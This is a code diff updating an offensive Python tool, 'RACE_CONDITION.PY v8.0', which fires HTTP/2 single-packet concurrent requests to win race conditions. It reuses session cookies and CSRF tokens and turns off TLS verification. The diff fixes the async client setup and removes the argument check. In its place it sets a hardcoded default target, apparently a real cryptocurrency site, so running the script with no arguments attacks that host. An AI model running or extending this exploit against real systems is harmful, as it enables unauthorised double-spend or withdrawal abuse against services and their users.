@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-RACE_CONDITION.PY v7.5 — HTTP/2 Single-Packet Concurrency Engine (Elite Edition)
+RACE_CONDITION.PY v8.0 — HTTP/2 Single-Packet Concurrency Engine (Elite Edition)
 Features:
 - True HTTP/2 Single-Packet Multi-Stream Multiplexing (zero network jitter spread)
 - Shared persistent session pool integration (cookies, CSRF headers, session tokens)
@@ -47,7 +47,6 @@ async def run_race_condition_test(target_url, port=443, use_ssl=True, session_po
     ]
     
     base_url = target_url.rstrip("/")
-    target_endpoint = f"{base_url}/user/withdraw/confirm" # Default fallback
 
     cookies = dict(session_pool.cookie_jar) if session_pool and hasattr(session_pool, 'cookie_jar') else {}
     default_headers = session_pool.default_headers if session_pool and hasattr(session_pool, 'default_headers') else {
@@ -67,16 +66,14 @@ async def run_race_condition_test(target_url, port=443, use_ssl=True, session_po
 
     race_findings = []
 
-    # Use a single shared client with HTTP/2 enabled to ensure connection multiplexing
-    async client_ctx = httpx.AsyncClient(
+    # Use a single shared client with HTTP/2 enabled using correct async context syntax
+    async with httpx.AsyncClient(
         base_url=base_url,
         http2=True,
         verify=False,
         follow_redirects=True,
         timeout=10.0
-    )
-
-    async with client_ctx as client:
+    ) as client:
         # Pre-warm the HTTP/2 connection to establish SETTINGS frames and stream window
         try:
             await client.get("/")
@@ -134,13 +131,5 @@ async def run_race_condition_test(target_url, port=443, use_ssl=True, session_po
     return race_findings
 
 if __name__ == "__main__":
-    if len(sys.argv) < 2:
-        print("Usage: python3 race_condition.py <target_url>")
-        sys.exit(1)
-    
-    # Simple standalone execution runner
-    async def main():
-        pool = None # Test wrapper
-        await run_race_condition_test(sys.argv[1], session_pool=pool)
-
-    asyncio.run(main())
+    target = sys.argv[1] if len(sys.argv) > 1 else "https://cryptobytes.online"
+    asyncio.run(run_race_condition_test(target))
